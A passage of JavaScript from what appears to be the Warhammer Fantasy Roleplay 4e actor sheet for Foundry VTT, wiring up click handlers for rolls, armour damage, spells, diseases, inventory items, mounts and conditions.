    html.on('click', '.test-select', this._onExtendedTestSelect.bind(this));
    html.on('mousedown', '.loaded-checkbox', this._onLoadedClick.bind(this));
    html.on('click', '.advance-diseases', this._onAdvanceDisease.bind(this));
    html.on('click', '.memorized-toggle', this._onMemorizedClick.bind(this));
    html.on('click', '.improvised-icon', this._onImprovisedClick.bind(this));
    html.on('mousedown', '.extended-SL', this._onExtendedSLClick.bind(this));
    html.on('click', '.condition-click', this._onConditionClicked.bind(this));
    html.on('mousedown', '.quantity-click', this._onQuantityClick.bind(this));
    html.on('click', '.weapon-item-name', this._onWeaponNameClick.bind(this));
    html.on('mousedown', '.armour-total', this._onArmourTotalClick.bind(this));
    html.on('mousedown', '.weapon-damage', this._onWeaponDamageClick.bind(this));
    html.on('change', '.skill-advances', this._onChangeSkillAdvances.bind(this));
    html.on('mousedown', '.condition-toggle', this._onConditionToggle.bind(this));
    html.on('click', '.toggle-enc', this._onToggleContainerEncumbrance.bind(this));
    html.on('change', '.ingredient-selector', this._onSelectIngredient.bind(this));
    html.on('mousedown', '.injury-duration', this._onInjuryDurationClick.bind(this));
    html.on('change', '.system-effect-select', this._onSystemEffectChanged.bind(this));
    html.on('mousedown', '.condition-value', this._onConditionValueClicked.bind(this));
    html.on('mousedown', '.metacurrency-value', this._onMetaCurrrencyClick.bind(this));
    html.on('mousedown', '.skill-total, .skill-select', this._onSkillClick.bind(this));
    html.on('mousedown', '.tab.inventory .item .item-name', this._onItemSplit.bind(this));
    html.on('focusin', '.skill-advances, .ch-edit', this._saveFocus.bind(this));
    html.on('click', '.attacker-remove', this._onAttackerRemove.bind(this));
    html.on('click', '.currency-convert-right', this._onConvertCurrencyClick.bind(this));
    html.on('click', '.sort-items', this._onSortClick.bind(this));
    html.on('click', '.group-actions', this._toggleGroupAdvantageActions.bind(this));
    html.on('click', '.weapon-property .inactive', this._toggleWeaponProperty.bind(this));
    html.on('click', '.section-collapse', this._toggleSectionCollapse.bind(this));
    html.on('click', '.diagnosed', this._onDiagnoseToggle.bind(this));
    html.on('click', '.open-vehicle', this._onVehicleClick.bind(this));
    html.on('click', '.remove-vehicle', this._onVehicleRemove.bind(this));
    html.on('click', '.aspect-use', this._onAspectClick.bind(this));

    
    html.on("click", ".trigger-script", this._onTriggerScript.bind(this));
    html.on("click", ".apply-target-effect", this._onApplyTargetEffect.bind(this));
    html.on("click", ".place-area-effect", this._onPlaceAreaEffect.bind(this));

    // Item Dragging
    let handler = this._onDragStart.bind(this);
    html.find('.item').each((i, li) => {
      li.setAttribute("draggable", true);
      li.addEventListener("dragstart", handler, false);
    });


    html.on("dragenter", ".mount-drop", ev => {
      ev.target.classList.add("dragover");
    });
    html.on("dragleave", ".mount-drop", ev => {
      ev.target.classList.remove("dragover");
    });
    html.on("drop", ".mount-drop", async ev => {
      ev.target.classList.remove("dragover");
      let dragData = JSON.parse(ev.originalEvent.dataTransfer.getData("text/plain"));

      let mount = await Actor.implementation.fromDropData(dragData);
      if (game.wfrp4e.config.actorSizeNums[mount.details.size.value] < game.wfrp4e.config.actorSizeNums[this.actor.details.size.value])
        return ui.notifications.error(game.i18n.localize("MountError"))

      let mountData = {
        id: mount.id,
        mounted: true,
        isToken: false
      };
      if(this.actor.prototypeToken.actorLink && !mount.prototypeToken.actorLink)
        ui.notifications.warn(game.i18n.localize("WarnUnlinkedMount"));

      this.actor.update({ "system.status.mount": mountData });
    });

    html.on('click', '.mount-toggle', this._onMountToggle.bind(this));
    html.on('click', '.mount-remove', this._onMountRemove.bind(this));


    html.on('click', '.mount-section', ev => {
      this.actor.mount.sheet.render(true);
    });

    // ---- Listen for custom entity links -----
    html.on("click", ".chat-roll", WFRP_Utility.handleRollClick.bind(WFRP_Utility));
    html.on("click", ".symptom-tag", WFRP_Utility.handleSymptomClick.bind(WFRP_Utility));
    html.on("click", ".condition-chat", WFRP_Utility.handleConditionClick.bind(WFRP_Utility));
    html.on("click", ".property-chat", WFRP_Utility.handlePropertyClick.bind(WFRP_Utility));
    html.on('mousedown', '.table-click', WFRP_Utility.handleTableClick.bind(WFRP_Utility));
    html.on('mousedown', '.pay-link', WFRP_Utility.handlePayClick.bind(WFRP_Utility));
    html.on('mousedown', '.credit-link', WFRP_Utility.handleCreditClick.bind(WFRP_Utility));
    html.on('mousedown', '.corruption-link', WFRP_Utility.handleCorruptionClick.bind(WFRP_Utility));
    html.on('mousedown', '.fear-link', WFRP_Utility.handleFearClick.bind(WFRP_Utility));
    html.on('mousedown', '.terror-link', WFRP_Utility.handleTerrorClick.bind(WFRP_Utility));
    html.on('mousedown', '.exp-link', WFRP_Utility.handleExpClick.bind(WFRP_Utility));

    html.on("click", ".use-grp-adv", this._onUseGrpAdvAction.bind(this));

  }

  //#region ROLLING
  //@@@@@@@@@ ROLLING @@@@@@@@@@@/

  _onCharClick(ev) {
    ev.preventDefault();
    let characteristic = ev.currentTarget.attributes["data-char"].value;
    this.actor.setupCharacteristic(characteristic).then(test => {
      test.roll();
    });
  }

  _onSkillClick(ev) {
    let itemId = this._getId(ev);
    let skill = this.actor.items.get(itemId);

    if (ev.button == 0) {
      skill = this.actor.items.get(itemId);
      this.actor.setupSkill(skill).then(test => {
        test.roll();
      });
    }
    else if (ev.button == 2) {
      skill.sheet.render(true);
    }
  }

  _onExtendedTestSelect(ev) {
    let itemId = this._getId(ev);
    let item = this.actor.items.get(itemId);
    this.actor.setupExtendedTest(item);
  }

  _onWeaponNameClick(ev) {
    ev.preventDefault();
    let itemId = this._getId(ev);
    let weapon = this.actor.items.get(itemId);
    if (weapon) this.actor.setupWeapon(weapon).then(setupData => {
      if (!setupData.abort)
        this.actor.weaponTest(setupData);
    });
  }
  async _onUnarmedClick(ev) {
    ev.preventDefault();
    let unarmed = game.wfrp4e.config.systemItems.unarmed;
    this.actor.setupWeapon(unarmed).then(setupData => {
      this.actor.weaponTest(setupData);
    });
  }
  async _onDodgeClick(ev) {
      this.actor.setupSkill(game.i18n.localize("NAME.Dodge"), {skipTargets: true}).then(test => {
        test.roll();
      });
  }
  async _onImprovisedClick(ev) {
    ev.preventDefault();
    let improv = game.wfrp4e.config.systemItems.improv;
    this.actor.setupWeapon(improv).then(setupData => {
      this.actor.weaponTest(setupData);
    });
  }

  async _onStompClick(ev) {
    ev.preventDefault();
    let stomp = game.wfrp4e.config.systemItems.stomp;
    this.actor.setupTrait(stomp).then(setupData => {
      this.actor.traitTest(setupData);
    });
  }
  async _onRestClick(ev) {
    let skill = this.actor.getItemTypes("skill").find(s => s.name == game.i18n.localize("NAME.Endurance"));
    let options = {rest: true, tb: this.actor.characteristics.t.bonus, skipTargets: true};
    if (skill)
      this.actor.setupSkill(skill, options).then(setupData => {
        this.actor.basicTest(setupData);
      });
    else
      this.actor.setupCharacteristic("t", options).then(setupData => {
        this.actor.basicTest(setupData);
      });
  }

  _onTraitRoll(ev) {
    ev.preventDefault();
    if (ev.button == 2)
      return this._onItemSummary(ev);

    let itemId = this._getId(ev);
    let trait = this.actor.items.get(itemId);
    this.actor.setupTrait(trait).then(setupData => {
      this.actor.traitTest(setupData);
    });
  }
  _onSpellRoll(ev) {
    ev.preventDefault();
    if (ev.button == 2)
      return this._onItemSummary(ev);

    let itemId = this._getId(ev);
    let spell = this.actor.items.get(itemId);
    this.spellDialog(spell);
  }

  _onPrayerRoll(ev) {
    ev.preventDefault();
    if (ev.button == 2)
      return this._onItemSummary(ev);

    let itemId = this._getId(ev);
    let prayer = this.actor.items.get(itemId);
    this.actor.setupPrayer(prayer).then(setupData => {
      this.actor.prayerTest(setupData);
    });
  }

  //#endregion

  //#region SHEET INTERACTIONS
  //@@@@@@@@@ INTERACTIONS @@@@@@@@@@@/

  _saveFocus(ev) {
    if (ev.target.attributes["data-id"])
      this.saveFocus = `data-id="${ev.target.attributes["data-id"].value}`;

    if (ev.target.attributes["data-char"])
      this.saveFocus = `data-char="${ev.target.attributes["data-char"].value}`;
  }

  async _onEditChar(ev) {
    ev.preventDefault();
    let characteristics = foundry.utils.duplicate(this.actor._source.system.characteristics);
    let ch = ev.currentTarget.attributes["data-char"].value;
    let newValue = Number(ev.target.value);

    if (this.actor.type == "character")
    {
      let resolved = await WFRP_Utility.advancementDialog(ch, newValue, "characteristic", this.actor);

      // If not resolved, reset characteristic ui value
      if (!resolved)
      {
        ev.target.value = characteristics[ch].advances;
        return 
      }
      else characteristics[ch].advances = newValue;
    }
    else { // If not character
      if (!(newValue == characteristics[ch].initial + characteristics[ch].advances)) {
        characteristics[ch].initial = newValue;
        characteristics[ch].advances = 0;
      }
    }
    return this.actor.update({ "system.characteristics": characteristics })
  }

  async _onChangeSkillAdvances(ev) {
    ev.preventDefault();
    let itemId = ev.target.attributes["data-id"].value;
    let itemToEdit = this.actor.items.get(itemId);
    if (this.actor.type == "character")
    {
      let resolved = await WFRP_Utility.advancementDialog(
        itemToEdit,
        Number(ev.target.value), 
        "skill", 
        this.actor);

        // reset advances value if dialog was not resolved
        if (!resolved)  
        {
          ev.target.value = itemToEdit.advances.value;
          return
        }
    }
    itemToEdit.update({ "system.advances.value": Number(ev.target.value) });
  }

  _onSelectAmmo(ev) {
    let itemId = ev.target.attributes["data-id"].value;
    const item = this.actor.items.get(itemId);
    WFRP_Audio.PlayContextAudio({ item, action: "load" });
    return item.update({ "system.currentAmmo.value": ev.target.value });
  }

  _onSelectSpell(ev) {
    let itemId = ev.target.attributes["data-id"].value;
    const ing = this.actor.items.get(itemId);
    return ing.update({ "system.spellIngredient.value": ev.target.value });
  }

  _onSelectIngredient(ev) {
    let itemId = ev.target.attributes["data-id"].value;
    const spell = this.actor.items.get(itemId);
    return spell.update({ "system.currentIng.value": ev.target.value });
  }

  _onSkillSwitch(ev) {
    this.actor.setFlag("wfrp4e", "showExtendedTests", !getProperty(this.actor, "flags.wfrp4e.showExtendedTests"));
    this.render(true);
  }

  _onExtendedSLClick(ev) {
    let itemId = this._getId(ev);
    let item = this.actor.items.get(itemId);
    let SL;
    if (ev.button == 0) SL = item.SL.current + 1;
    else if (ev.button == 2) SL = item.SL.current - 1;

    if (SL < 0 && !item.negativePossible.value)
      SL = 0;
    return item.update({ "system.SL.current": SL })
  }

  _onAPClick(ev) {
    let itemId = this._getId(ev);
    let APlocation = $(ev.currentTarget).parents(".armour-box").attr("data-location");
    let item = this.actor.items.get(itemId);
    let itemData = item.toObject();

    let maxDamageAtLocation = item.AP[APlocation] + Number(item.properties.qualities.durable?.value || 0);
    let minDamageAtLocation = 0;

    switch (ev.button) {
      case 2:
        itemData.system.APdamage[APlocation] = Math.min(maxDamageAtLocation, itemData.system.APdamage[APlocation] + 1);
        break;
      case 0:
        itemData.system.APdamage[APlocation] = Math.max(minDamageAtLocation, itemData.system.APdamage[APlocation] - 1);
        break
    }
    this.actor.updateEmbeddedDocuments("Item", [itemData]);
  }

  _onWeaponDamageClick(ev) {
    let itemId = this._getId(ev);
    let item = this.actor.items.get(itemId);
    let itemData = item.toObject();

    let regex = /\d{1,3}/gm;
    let maxDamage = Number(regex.exec(item.damage.value)[0] || 0) + Number(item.properties.qualities.durable?.value || 0) || 999;
    let minDamage = 0;

    if (ev.button == 2) {
      itemData.system.damageToItem.value = Math.min(maxDamage, itemData.system.damageToItem.value + 1);
      WFRP_Audio.PlayContextAudio({ item: item, action: "damage", outcome: "weapon" });
    }
    else if (ev.button == 0)
      itemData.system.damageToItem.value = Math.max(minDamage, itemData.system.damageToItem.value - 1);

    //TODO This (and other validations) really should be elsewhere 
    if (maxDamage == itemData.system.damageToItem.value)
    {
        itemData.system.equipped = false;
    }


    this.actor.updateEmbeddedDocuments("Item", [itemData]);
  }

  _onArmourTotalClick(ev) {
    let location = $(ev.currentTarget).closest(".column").find(".armour-box").attr("data-location");
    if (!location) location = $(ev.currentTarget).closest(".column").attr("data-location");
    if (!location) return;

    let armourTraits = this.actor.getItemTypes("trait").filter(i => i.name.toLowerCase() == game.i18n.localize("NAME.Armour").toLowerCase()).map(i => i.toObject());
    let armourItems = this.actor.getItemTypes("armour").filter(i => i.isEquipped).sort((a, b) => a.sort - b.sort);
    let armourToDamage;
    let usedTrait = false;
    // Damage traits first
    for (let armourTrait of armourTraits) {
      // If APDamage flag doesn't exist
      if (armourTrait && !getProperty(armourTrait, "flags.wfrp4e.APdamage")) foundry.utils.setProperty(armourTrait, "flags.wfrp4e.APdamage", { head: 0, body: 0, lArm: 0, rArm: 0, lLeg: 0, rLeg: 0 });
      if (armourTrait) {
        if (ev.button == 0) {
          if (armourTrait.flags.wfrp4e.APdamage[location] != 0) {
            armourTrait.flags.wfrp4e.APdamage[location]--;
            usedTrait = true;
          }
        }
        if (ev.button == 2) {
          // If AP Damage at location is maxed, go to the next iteration
          if (armourTrait.flags.wfrp4e.APdamage[location] == Number(armourTrait.system.specification.value)) { continue }
          // Else, damage that location
          if (armourTrait.flags.wfrp4e.APdamage[location] != Number(armourTrait.system.specification.value)) {
            armourTrait.flags.wfrp4e.APdamage[location]++;
            usedTrait = true;
          }
        }
        if (usedTrait)
          return this.actor.updateEmbeddedDocuments("Item", [armourTrait])

      }
    }
    if (armourItems && !usedTrait) {
      if (ev.button == 0) armourItems.reverse();
      for (let a of armourItems) {
        if (ev.button == 2) {
          if (a.currentAP[location] > 0) {
            armourToDamage = a;
            break
          }
        }
        else if (ev.button == 0) {
          if (a.AP[location] > 0 && a.APdamage[location] > 0) {
            armourToDamage = a;
            break
          }
        }
      }
    }
    if (!armourToDamage)
      return
    let durable = armourToDamage.properties.qualities.durable;
    armourToDamage = armourToDamage.toObject();

      // Damage on right click 
      if (ev.button == 2) {                            // Damage shouldn't go past AP max (accounting for durable)
        armourToDamage.system.APdamage[location] = Math.min(armourToDamage.system.AP[location] + (Number(durable?.value) || 0), armourToDamage.system.APdamage[location] + 1);
        ui.notifications.notify(game.i18n.localize("SHEET.ArmourDamaged"));
      }
      // Repair on left
      if (ev.button == 0) {                         // Damage shouldn't go below 0
        armourToDamage.system.APdamage[location] = Math.max(0, armourToDamage.system.APdamage[location] - 1);
        ui.notifications.notify(game.i18n.localize("SHEET.ArmourRepaired"));
      }
      return this.actor.updateEmbeddedDocuments("Item", [armourToDamage])
    }


  _onShieldClick(ev) {
    let shields = this.actor.getItemTypes("weapon").filter(i => i.isEquipped && i.properties.qualities.shield);
    for (let s of shields) {
      let shieldQualityValue = s.properties.qualities.shield.value;
      if (ev.button == 2) {
        if (s.damageToItem.shield < Number(shieldQualityValue)) {
          WFRP_Audio.PlayContextAudio({ item: s, action: "damage", outcome: "shield" });
          return s.update({ "system.damageToItem.shield": s.damageToItem.shield + 1 });
        }
      }
      if (ev.button == 0) {
        if (s.damageToItem.shield != 0) {
          return s.update({ "system.damageToItem.shield": s.damageToItem.shield - 1 });
        }
      }
    }
  }

  async _onMemorizedClick(ev) {
    let itemId = this._getId(ev);
    const spell = this.actor.items.get(itemId);


    // unmemorized
    if (spell.memorized.value)
    {
      WFRP_Audio.PlayContextAudio({ item: spell, action: "unmemorize" });
      return spell.update({ "system.memorized.value": !spell.memorized.value })
    }


    let memorize = true;
    if (this.actor.type == "character") {
      memorize = await WFRP_Utility.memorizeCostDialog(spell, this.actor);
    }

    if (!memorize) 
      return
    
    if (!spell.memorized.value)
      WFRP_Audio.PlayContextAudio({ item: spell, action: "memorize" });
    else
      WFRP_Audio.PlayContextAudio({ item: spell, action: "unmemorize" });
    
    return spell.update({ "system.memorized.value": !spell.memorized.value })


  }

  _onSpellSLClick(ev) {
    let itemId = this._getId(ev);
    const spell = this.actor.items.get(itemId);
    let SL = spell.cn.SL;
    switch (ev.button) {
      case 0: SL++;
        if (SL > (spell.memorized.value ? spell.cn.value : spell.cn.value * 2))
          SL = (spell.memorized.value ? spell.cn.value : spell.cn.value * 2);
        break;
      case 2:
        SL--;
        if (SL < 0)
          SL = 0;
        break
    }
    return spell.update({ "system.cn.SL": SL })
  }

  async _onDiseaseRoll(ev) {
    const itemId = this._getId(ev);
    let disease = this.actor.items.get(itemId).toObject();
    const type = ev.target.dataset["type"];

    if (!isNaN(disease.system[type].value)) {
      if (ev.button === 0) {
        disease = await this.actor.decrementDisease(disease, false);
      } else {
        let number = Number(disease.system[type].value);
        disease.system[type].value = ++number;

        if (type === "incubation")
          disease.system.duration.active = false;
      }
    } else if (ev.button === 0) {
      try {
        disease.system[type].value = (await new Roll(disease.system[type].value).roll()).total;

        if (type === "duration")
          disease.system.duration.active = true;
      } catch {
        return ui.notifications.error(game.i18n.localize("ERROR.ParseDisease"));
      }
    }

    if (disease)
      await this.actor.updateEmbeddedDocuments("Item", [disease]);
  }

  async _onInjuryDurationClick(ev) {
    let itemId = this._getId(ev);
    let injury = this.actor.items.get(itemId).toObject();
    if (!isNaN(injury.system.duration.value)) {
      if (ev.button == 0)
        return this.actor.decrementInjury(injury)
      else injury.system.duration.value++;
      return this.actor.updateEmbeddedDocuments("Item", [injury])
    }
    else {
      try {
        let roll = await new Roll(injury.system.duration.value, this.actor).roll();
        roll.toMessage({speaker : {alias : this.actor.name}, flavor : injury.name});
        injury.system.duration.value = roll.total;
        injury.system.duration.active = true;
        return this.actor.updateEmbeddedDocuments("Item", [injury])
      }
      catch
      {
        return ui.notifications.error(game.i18n.localize("ERROR.ParseInjury"))
      }
    }
  }

  async _onMetaCurrrencyClick(ev) {
    let type = $(ev.currentTarget).attr("data-point-type");
    let newValue = ev.button == 0 ? this.actor.status[type].value + 1 : this.actor.status[type].value - 1;
    return this.actor.update({ [`system.status.${type}.value`]: newValue })
  }

  async _onItemEdit(ev) {
    let itemId = this._getId(ev);
    let uuid = this._getUUID(ev);
    const item = uuid ? await fromUuid(uuid) : this.actor.items.get(itemId);
    return item.sheet.render(true)
  }

  _onEffectDelete(ev) {
    let uuid = this._getUUID(ev);
    let effect = fromUuidSync(uuid);
    effect.delete();  
  }

  async _onEffectEdit(ev) {
    let uuid = this._getUUID(ev);
    let effect = fromUuidSync(uuid);
    return effect.sheet.render(true);
  }

  async _onEffectToggle(ev)
  {
    let uuid = this._getUUID(ev);
    let effect = fromUuidSync(uuid);
    await effect.update({disabled : !effect.disabled});

    // If disabling an effect that is not a descedent of this actor (like a vehicle effect applying to this actor), rerender the sheet
    if (effect.actor.uuid != this.actor.uuid)
    {
      this.render(true);
    }
  }

  _onAdvanceDisease(ev) {
    return this.actor.decrementDiseases()
  }

  _onItemDelete(ev) {
    let li = $(ev.currentTarget).parents(".item");
    let itemId = this._getId(ev);
    if (this.actor.items.get(itemId).name == "Boo") {
      AudioHelper.play({ src: `${game.settings.get("wfrp4e", "soundPath")}squeek.wav` }, false);
      return
    }
    renderTemplate('systems/wfrp4e/templates/dialog/delete-item-dialog.hbs').then(html => {
      new Dialog({
        title: game.i18n.localize("Delete Confirmation"), 
        content: `<div class="delete-item-dialog selection"> 
                  <label>${game.i18n.localize("DIALOG.DeleteItem")}</label>
                  </div>`,
        buttons: {
          yes: {
            icon: '<i class="fa fa-check"></i>', label: game.i18n.localize("Yes"), callback: async dlg => {
              await this.actor.deleteEmbeddedDocuments("Item", [itemId]);
              li.slideUp(200, () => this.render(false));
            }
          }, cancel: { icon: '<i class="fas fa-times"></i>', label: game.i18n.localize("Cancel") },
        }, default: 'yes'
      }).render(true);
    });
  }

  _onItemRemove(ev) {
    let itemId = this._getId(ev);
    const item = this.actor.items.get(itemId);
    return item.update({ "system.location.value": "" })
  }

  _onToggleContainerEncumbrance(ev) {
    let itemId = this._getId(ev);
    const item = this.actor.items.get(itemId);
    return item.update({ "system.countEnc.value": !item.countEnc.value })
  }

  _onItemToggle(ev) {
    let itemId = this._getId(ev);
    let item = this.actor.items.get(itemId).toObject();
    let equippedState;
    if (item.type == "armour") {
      item.system.worn.value = !item.system.worn.value;
      equippedState = item.system.worn.value;
    } else if (item.type == "weapon") {
      item.system.equipped = !item.system.equipped;
      equippedState = item.system.equipped;
      let newEqpPoints = item.system.twohanded.value ? 2 : 1;
      if (game.settings.get("wfrp4e", "limitEquippedWeapons") && this.actor.type != "vehicle")
        if (this.actor.equipPointsUsed + newEqpPoints > this.actor.equipPointsAvailable && equippedState) {
          AudioHelper.play({ src: `${game.settings.get("wfrp4e", "soundPath")}/no.wav` }, false);
          return ui.notifications.error(game.i18n.localize("ErrorLimitedWeapons"))
        }
      foundry.utils.setProperty(item, "system.offhand.value", false);
    }
    else if (item.type == "trapping" && item.system.trappingType.value == "clothingAccessories") {
      item.system.worn = !item.system.worn;
      equippedState = item.system.worn;
    }
    WFRP_Audio.PlayContextAudio({ item: this.actor.items.get(itemId), action: "equip", outcome: equippedState });
    this.actor.updateEmbeddedDocuments("Item", [item]);
  }

  _onCheckboxClick(ev) {
    let itemId = this._getId(ev);
    let target = $(ev.currentTarget).attr("data-target");
    this.toggleItemCheckbox(itemId, target);
  }

  _onLoadedClick(ev) {
    let itemId = this._getId(ev);
    let item = this.actor.items.get(itemId);
    let itemObject = item.toObject();
    if (item.repeater) {
      if (ev.button == 0 && itemObject.system.loaded.amt >= itemObject.system.loaded.max) return
      if (ev.button == 2 && itemObject.system.loaded.amt <= 0)
        return
      if (ev.button == 0) itemObject.system.loaded.amt++;
      if (ev.button == 2) itemObject.system.loaded.amt--;
      itemObject.system.loaded.value = !!itemObject.system.loaded.amt;
    }
    else {
      itemObject.system.loaded.value = !itemObject.system.loaded.value;
      if (itemObject.system.loaded.value)
        itemObject.system.loaded.amt = itemObject.system.loaded.max || 1;
      else itemObject.system.loaded.amt = 0;
    }
    this.actor.updateEmbeddedDocuments("Item", [itemObject]).then(i => this.actor.checkReloadExtendedTest(item));
  }

  _onRepeaterClick(ev) {
    let itemId = this._getId(ev);
    let item = this.actor.items.get(itemId).toObject();
    item.system.loaded.value = !item.system.loaded.value;
    if (item.system.loaded.value) item.system.loaded.amt = item.system.loaded.max || 1;
    this.actor.updateEmbeddedDocuments("Item", [item]);
  }

  _onWornClick(ev) {
    let itemId = this._getId(ev);
    let item = this.actor.items.get(itemId);
    return item.update({ "system.worn.value": !item.worn.value })
  }

  _onQuantityClick(ev) {
    let itemId = this._getId(ev);
    let item = this.actor.items.get(itemId);
    let quantity = item.quantity.value;
    switch (ev.button) {
      case 0: if (ev.ctrlKey) quantity += 10;
      else quantity++;
        break;
      case 2: if (ev.ctrlKey) quantity -= 10;
      else quantity--;
        if (quantity < 0) quantity = 0;
        break
    }
    item.update({ "system.quantity.value": quantity });
  }

  async _onAggregateClick(ev) {
    let itemType = $(ev.currentTarget).attr("data-type");
    if (itemType == "ingredient") itemType = "trapping";
    let items = this.actor.getItemTypes(itemType).map(i => i.toObject());
    for (let i of items) {
      let duplicates = items.filter(x => x.name == i.name);
      if (duplicates.length > 1) {
        let newQty = duplicates.reduce((prev, current) => prev + parseInt(current.system.quantity.value), 0);
        i.system.quantity.value = newQty;
      }
    }
    let noDuplicates = [];
    for (let i of items) {
      if (!noDuplicates.find(x => x.name == i.name)) {
        noDuplicates.push(i);
        await this.actor.updateEmbeddedDocuments("Item", [{ "_id": i._id, "system.quantity.value": i.system.quantity.value }]);
      }
      else await this.actor.deleteEmbeddedDocuments("Item", [i._id]);
    }
  }
  _onItemSplit(ev) {
    if (ev.button == 2) {
      new Dialog({
        title: game.i18n.localize("SHEET.SplitTitle"), content: `<p>${game.i18n.localize("SHEET.SplitPrompt")}</p><div class="form-group"><input name="split-amt"type="text"/></div>`, buttons: {
          split: {
            label: game.i18n.localize("Split"), callback: (dlg) => {
              let amt = Number(dlg.find('[name="split-amt"]').val());
              if (Number.isNumeric(amt))
                return this.splitItem(this._getId(ev), amt)
            }
          }
        }, default: "split"
      }).render(true);
    }
  }
  async _onConditionValueClicked(ev) {
    let condKey = $(ev.currentTarget).parents(".sheet-condition").attr("data-cond-id");
    if (ev.button == 0)
      await this.actor.addCondition(condKey);
    else if (ev.button == 2)
      await this.actor.removeCondition(condKey);
  }
  async _onConditionToggle(ev) {
    let condKey = $(ev.currentTarget).parents(".sheet-condition").attr("data-cond-id");
    if (game.wfrp4e.config.statusEffects.find(e => e.id == condKey).flags.wfrp4e.value == null) {
      if (this.actor.hasCondition(condKey))
        await this.actor.removeCondition(condKey);
      else 
        await this.actor.addCondition(condKey);
      return
    }
    if (ev.button == 0)
      await this.actor.addCondition(condKey);
    else if (ev.button == 2)
      await this.actor.removeCondition(condKey);
  }
  async _onSpeciesEdit(ev) {
    let input = ev.target.value;
    let split = input.split("(");
    let species = split[0].trim();
    let subspecies;
    if (split.length > 1)
      subspecies = split[1].replace(")", "").trim();
    let speciesKey = WFRP_Utility.findKey(species, game.wfrp4e.config.species) || species;
    let subspeciesKey = "";
    if (subspecies) {
      for (let sub in game.wfrp4e.config.subspecies[speciesKey]) {
        if (game.wfrp4e.config.subspecies[speciesKey][sub].name == subspecies) subspeciesKey = sub;
      }
      if (!subspeciesKey)
        subspeciesKey = subspecies;
    }
    await this.actor.update({ "system.details.species.value": speciesKey, "system.details.species.subspecies": subspeciesKey });
    if (this.actor.type == "character")
      return
    try {
      let initialValues = await WFRP_Utility.speciesCharacteristics(speciesKey, true, subspeciesKey);
      let characteristics = this.actor.toObject().system.characteristics;
      for (let c in characteristics) {
        characteristics[c].initial = initialValues[c].value;
      }

      new Dialog({
        content: game.i18n.localize("SpecChar"), title: game.i18n.localize("Species Characteristics"), buttons: {
          yes: {
            label: game.i18n.localize("Yes"), callback: async () => {
              await this.actor.update({ 'system.characteristics': characteristics });

              await this.actor.update({ "system.details.move.value": WFRP_Utility.speciesMovement(species) || 4 });
            }
          }, no: { label: game.i18n.localize("No"), callback: () => { } }
        }
      }).render(true);
    } catch{ }
  }

  async _onRandomizeClicked(ev) {
    ev.preventDefault();
    let species = this.actor.details.species.value;
    let subspecies = this.actor.details.species.subspecies;
    try {
      switch (ev.target.text) {
        case game.i18n.localize("RANDOMIZER.C"): let creatureMethod = false;
          let characteristics = this.actor.toObject().system.characteristics;
          if (this.actor.type == "creature" || !species) creatureMethod = true;
          if (!creatureMethod) {
            let averageCharacteristics = await WFRP_Utility.speciesCharacteristics(species, true, subspecies);
            for (let char in characteristics) {
              if (characteristics[char].initial != averageCharacteristics[char].value) creatureMethod = true;
            }
          }
          if (!creatureMethod) {
            let rolledCharacteristics = await WFRP_Utility.speciesCharacteristics(species, false, subspecies);
            for (let char in rolledCharacteristics) {
              characteristics[char].initial = rolledCharacteristics[char].value;
            }
            await this.actor.update({ "system.characteristics": characteristics });
          }
          else if (creatureMethod) {
            let roll = new Roll("2d10");
            await roll.roll();
            let characteristics = this.actor.toObject().system.characteristics;
            for (let char in characteristics) {
              if (characteristics[char].initial == 0)
                continue
              characteristics[char].initial -= 10;
              characteristics[char].initial += (await roll.reroll()).total;
              if (characteristics[char].initial < 0)
                characteristics[char].initial = 0;
            }
            await this.actor.update({ "system.characteristics": characteristics });
          }
          return

        case game.i18n.localize("RANDOMIZER.S"):
          this.actor._advanceSpeciesSkills();
          return
        case game.i18n.localize("RANDOMIZER.T"):
          this.actor._advanceSpeciesTalents();
          return
      }
    }
    catch (error) {
      WFRP_Utility.log("Could not randomize: " + error, true);
    }
  }

  _onTriggerScript(ev)
  {
      let uuid = this._getUUID(ev);
      let index = this._getIndex(ev);

      let effect =  fromUuidSync(uuid);
      let script = effect.manualScripts[index];

      script.execute({actor : this.actor});
  }

  // Add condition description dropdown
  async _onConditionClicked(ev) {
    ev.preventDefault();
    let li = $(ev.currentTarget).parents(".sheet-condition"),
      elementToAddTo = $(ev.currentTarget).parents(".condition-list"),
      condkey = li.attr("data-cond-id"), expandData = await TextEditor.enrichHTML(`<h2>${game.wfrp4e.config.conditions[condkey]}</h2>` + game.wfrp4e.config.conditionDescriptions[condkey], {async: true});
      let existing = this.actor.hasCondition(condkey);

    if (elementToAddTo.hasClass("expanded")) {
      let summary = elementToAddTo.parents(".effects").children(".item-summary");
      summary.slideUp(200, () => summary.remove());
    }
    else {
      let div = $(`<div class="item-summary">${expandData}</div>`);
      if (existing?.manualScripts.length) {
        let button = $(`<br><br>
          ${existing.manualScripts.map((s, i) => `<a class="trigger-script" data-uuid="${existing.uuid}" data-index="${s.index}">${s.Label}</a>`)}
        `);
        div.append(button);
      }
      elementToAddTo.after(div.hide());
      div.slideDown(200);
    }
    elementToAddTo.toggleClass("expanded");
  }
  _onItemPostClicked(ev) {
    let itemId = this._getId(ev);
    const item = this.actor.items.get(itemId);
    item.postItem();
  }

  _onNameClicked(ev) {
    let name = NameGenWfrp.generateName({ species: this.actor.details.species.value, gender: this.actor.details.gender.value });
    this.actor.update({ "name": name });
  }

  _onMountToggle(ev) {
    ev.stopPropagation();
    this.actor.update({ "system.status.mount.mounted": !this.actor.status.mount.mounted });
  }

  _onMountRemove(ev) {
    ev.stopPropagation();
    let mountData = { id: "", mounted: false, isToken: false };
    this.actor.update({ "system.status.mount": mountData });
  }

  _onAttackerRemove(ev) {
    this.actor.update({ "flags.-=oppose": null });
  }

  _onMountClicked(ev) {
    this.actor.mount.sheet.render(true);
  }
  _onSystemEffectChanged(ev) {
    let ef = ev.target.value;
    this.actor.addSystemEffect(ef);
  }

  _onMoneyIconClicked(ev) {
    ev.preventDefault();
    let money = this.actor.getItemTypes("money");
    let newMoney = MarketWfrp4e.consolidateMoney(money.map(i => i.toObject()));
    return this.actor.updateEmbeddedDocuments("Item", newMoney)
  }

  /**
   * Handle creating a new Owned Item for the actor using initial data defined in the HTML dataset
   * @private
   * @param {Object} ev    ev triggered by clicking on the + button for any item list
   *  
   */
  _onItemCreate(ev) {
    ev.preventDefault();
    let header = ev.currentTarget,
      data = foundry.utils.duplicate(header.dataset);

    if (data.type == "effect")
      return this.actor.createEmbeddedDocuments("ActiveEffect", [{ name: game.i18n.localize("New Effect") }])

    if (data.type == "vehicle-role" && this.actor.type == "vehicle") {
